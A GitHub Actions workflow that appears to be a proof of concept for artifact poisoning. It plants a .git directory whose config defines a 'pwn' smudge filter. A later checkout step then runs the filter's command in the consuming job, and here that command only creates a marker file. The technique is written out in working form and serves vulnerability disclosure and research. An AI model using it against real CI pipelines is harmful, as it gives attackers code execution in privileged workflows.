name: poc-artifact-git
on:
  workflow_dispatch:

jobs:
  produce:
    runs-on: ubuntu-latest
    steps:
      - name: Build malicious .git directory with filter payload
        run: |
          set -eux
          rm -rf evil art
          mkdir evil
          cd evil
          git init -q -b main .
          git config user.email poc@example.com
          git config user.name poc
          printf '%s\n' '*.dat filter=pwn' > .gitattributes
          echo 'attacker committed content' > payload.dat
          git add -A
          git commit -qm 'attacker commit'
          printf '%s\n' \
            '[core]' \
            '	repositoryformatversion = 0' \
            '	filemode = true' \
            '	bare = false' \
            '	logallrefupdates = true' \
            '[remote "origin"]' \
            '	url = https://github.com/PDFtoMark/gab-poc-gitartifact' \
            '	fetch = +refs/heads/*:refs/remotes/origin/*' \
            '[filter "pwn"]' \
            '	smudge = touch /tmp/PWN_FILTER_SMUDGE && cat' \
            '	clean = cat' \
            > .git/config
          cat .git/config
          cd ..
          mkdir art
          cp -r evil/.git art/.git
          echo 1 > art/pr_number.txt
      - name: Upload artifact named pr-number
        uses: actions/upload-artifact@v4
        with:
          name: pr-number
          path: art
          include-hidden-files: true

  consume:
    needs: produce
    runs-on: ubuntu-latest
    steps:
      - name: Download untrusted artifact into workspace
        uses: actions/download-artifact@v4
        with:
          name: pr-number
      - name: Inspect planted .git before checkout
        run: |
          set -x
          ls -la
          git --git-dir=.git log --oneline || true
          git --git-dir=.git config --get-regexp 'filter|remote' || true
          ls -la /tmp/PWN_FILTER_SMUDGE || echo 'not yet executed'
      - name: Privileged checkout step
        uses: actions/checkout@v4
        with:
          persist-credentials: false
      - name: Did attacker git config execute code in this job?
        run: |
          set -x
          ls -la /tmp/PWN_FILTER_SMUDGE
          cat payload.dat
          env | grep -c '^INPUT_' || true
